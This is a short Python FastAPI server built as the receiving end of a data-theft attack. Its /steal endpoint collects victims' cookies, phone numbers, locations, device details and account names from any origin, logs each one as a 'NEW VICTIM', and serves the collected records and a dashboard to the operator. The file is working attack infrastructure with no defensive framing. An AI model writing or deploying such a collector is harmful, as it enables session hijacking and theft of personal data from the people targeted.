from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
import uvicorn
from datetime import datetime

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

stolen_data = []

@app.post("/steal")
async def steal(request: Request):
    global stolen_data
    body = await request.json()
    entry = {
        "timestamp": datetime.now().strftime("%H:%M:%S"),
        "ip": request.client.host,
        "user_agent": request.headers.get("user-agent", "Unknown"),
        "cookies": body.get("cookies", ""),
        "device": body.get("device", ""),
        "location": body.get("location", "Unknown"),
        "screen": body.get("screen", ""),
        "phone": body.get("phone", ""),
        "account": body.get("name", "")
    }
    stolen_data.append(entry)
    print(f"🔴 NEW VICTIM: {entry['ip']} — {entry['phone']} at {entry['timestamp']}")
    return {"status": "ok"}

@app.get("/data")
async def get_data():
    global stolen_data
    return {"victims": stolen_data, "count": len(stolen_data)}

@app.delete("/reset")
async def reset():
    global stolen_data
    stolen_data = []
    print("🗑️ All data cleared")
    return {"status": "cleared"}

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    return open("dashboard.html").read()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=7000)
